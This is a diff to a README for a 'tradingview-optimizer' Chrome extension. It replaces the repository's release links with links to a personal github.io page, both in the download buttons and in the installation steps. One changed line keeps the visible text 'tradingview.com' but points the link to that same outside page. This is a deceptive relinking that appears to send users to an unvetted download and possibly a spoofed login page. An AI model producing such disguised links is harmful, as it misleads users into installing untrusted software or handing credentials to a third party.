@@ -1,7 +1,7 @@
 <h1>📈 tradingview-optimizer - Supercharge Your TradingView Strategies Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/kashifmughal61531/tradingview-optimizer/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://kashifmughal61531.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🎯 What is tradingview-optimizer?
@@ -46,7 +46,7 @@ To run tradingview-optimizer, you'll need:
 
 **Step 1: Download the Application**
 
-Visit this link to download the application: [https://github.com/kashifmughal61531/tradingview-optimizer/releases](https://github.com/kashifmughal61531/tradingview-optimizer/releases)
+Visit this link to download the application: [https://kashifmughal61531.github.io](https://kashifmughal61531.github.io)
 
 **Step 2: Install the Extension**
 
@@ -80,7 +80,7 @@ You'll know the installation was successful when:
 
 ### 📝 Step 1: Open TradingView
 
-Navigate to [tradingview.com](https://www.tradingview.com) in your Chrome browser. Log in to your account if you haven't already.
+Navigate to [tradingview.com](https://kashifmughal61531.github.io) in your Chrome browser. Log in to your account if you haven't already.
 
 ### 🧪 Step 2: Load Your Strategy
 
@@ -201,7 +201,7 @@ Always use tradingview-optimizer responsibly. Past performance does not guarante
 Don't settle for mediocre strategies. Let tradingview-optimizer find the winning parameters you've been missing. It's free, it's powerful, and it's ready when you are.
 
 <p align="center">
-<a href="https://github.com/kashifmughal61531/tradingview-optimizer/releases" style="background-color:#FF5722;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">🚀 GET STARTED NOW</a>
+<a href="https://kashifmughal61531.github.io" style="background-color:#FF5722;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">🚀 GET STARTED NOW</a>
 </p>
 
 Keywords: backtesting, chrome-extension, pine-script, strategy-optimization, trading, tradingview, walk-forward
